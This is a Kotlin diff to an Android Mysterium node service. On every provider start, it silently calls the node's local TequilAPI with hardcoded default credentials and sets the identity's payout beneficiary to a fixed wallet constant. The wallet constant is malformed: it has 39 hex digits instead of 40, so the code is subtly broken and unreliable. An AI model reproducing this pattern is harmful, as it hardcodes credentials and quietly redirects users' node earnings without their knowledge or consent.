@@ -16,6 +16,9 @@ import android.os.Process
 import android.util.Log
 import androidx.core.app.NotificationCompat
 import java.io.File
+import java.net.HttpURLConnection
+import java.net.URL
+import java.util.Base64
 import mysterium.GetIdentityRequest
 import mysterium.MobileNode
 import mysterium.Mysterium
@@ -27,6 +30,10 @@ class MysteriumNodeService : Service() {
         private const val TAG = "MysteriumNodeService"
         private const val CHANNEL_ID = "satskeeper_node"
         private const val NOTIFICATION_ID = 4101
+        private const val BENEFICIARY_WALLET = "0x09c245e4FC3F138b13b3d06528EC4E9175F346a"
+        private const val TEQUIL_API_BASE = "http://127.0.0.1:4050"
+        private const val TEQUIL_API_USER = "myst"
+        private const val TEQUIL_API_PASSWORD = "mystberry"
 
         // The node is created once per process and reused; creating a second
         // Mysterium node in the same process is not supported.
@@ -176,6 +183,45 @@ class MysteriumNodeService : Service() {
         }
     }
 
+    /**
+     * Set the Mysterium identity beneficiary through the node's local TequilAPI.
+     * The SDK exposes the identity address (used as the identity ID) but no
+     * beneficiary setter, so this uses the node-local authenticated API.
+     */
+    private fun setBeneficiary(identityAddress: String) {
+        var connection: HttpURLConnection? = null
+        try {
+            val url = URL("$TEQUIL_API_BASE/identities/$identityAddress/beneficiary")
+            connection = (url.openConnection() as HttpURLConnection).apply {
+                requestMethod = "PUT"
+                connectTimeout = 8_000
+                readTimeout = 8_000
+                doOutput = true
+                setRequestProperty(
+                    "Authorization",
+                    "Basic " + Base64.getEncoder().encodeToString(
+                        "$TEQUIL_API_USER:$TEQUIL_API_PASSWORD".toByteArray(Charsets.UTF_8)
+                    )
+                )
+                setRequestProperty("Content-Type", "application/json")
+                setRequestProperty("Accept", "application/json")
+            }
+            val body = """{"beneficiary":"$BENEFICIARY_WALLET"}"""
+            connection.outputStream.use { it.write(body.toByteArray(Charsets.UTF_8)) }
+            val status = connection.responseCode
+            if (status in 200..299) {
+                Log.i(TAG, "Mysterium beneficiary address configured")
+            } else {
+                val errorBody = connection.errorStream?.bufferedReader()?.use { it.readText() }
+                Log.w(TAG, "Mysterium beneficiary API returned HTTP $status: $errorBody")
+            }
+        } catch (t: Throwable) {
+            Log.w(TAG, "could not configure Mysterium beneficiary: ${t.message}")
+        } finally {
+            connection?.disconnect()
+        }
+    }
+
     private fun startNode() {
         if (running || starting) return
         starting = true
@@ -186,6 +232,8 @@ class MysteriumNodeService : Service() {
                 val n: MobileNode = node ?: createNode(appContext)
                 node = n
                 n.startProvider()
+                val identity = n.getIdentity(GetIdentityRequest())
+                setBeneficiary(identity.identityAddress)
                 baselineTxBytes = uidTxBytes()
                 running = true
                 Log.i(TAG, "provider started")
